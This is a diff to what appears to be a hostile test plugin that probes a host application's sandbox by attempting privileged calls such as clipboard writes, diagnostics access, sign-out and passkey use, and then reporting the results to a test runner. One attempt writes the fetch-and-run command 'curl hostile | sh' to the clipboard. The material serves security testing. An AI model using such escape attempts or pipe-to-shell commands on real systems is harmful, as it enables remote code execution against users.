@@ -179,6 +179,9 @@ async function backgroundAttacks(app, exfil) {
     raw("clipboard.write", ["curl hostile | sh"]),
   );
   r["shell.step-up"] = await attempt(() => raw("stepUp"));
+  r["shell.diagnostics-open"] = await attempt(() =>
+    raw("diagnostics.open", [{ pluginId: "hostile-victim" }]),
+  );
   r["shell.sign-out"] = await attempt(() => raw("session.signOut"));
   r["shell.passkey"] = await attempt(() => raw("passkey.run", ["x", {}]));
   r["shell.serial"] = await attempt(() =>
@@ -356,7 +359,8 @@ async function backgroundAttacks(app, exfil) {
   await app.api.post("/report", { role: "background", results: r });
 
   // Open its own view once the runner is past the setup screen.
-  for (let i = 0; i < 120; i++) {
+  // A slow setup on a busy lab can take minutes.
+  for (let i = 0; i < 600; i++) {
     const { data: state } = await app.api.get("/go");
     if (state.go) break;
     await wait(500);
@@ -399,9 +403,12 @@ export function activate(app) {
     singleton: true,
     hostless: true,
   });
+  // Only the background frame runs the attacks.
+  if (!/role=background/.test(window.location.hash)) return;
+  // A timer started in activate keeps the shell from stopping this frame as
+  // idle while it waits for the runner, even with many other frames up.
+  setInterval(() => {}, 60_000);
   void (async () => {
-    // Only the background frame runs the attacks.
-    if (!/role=background/.test(window.location.hash)) return;
     const { data } = await app.api.get("/config");
     if (!data.exfilOrigin) return;
     await backgroundAttacks(app, data.exfilOrigin);
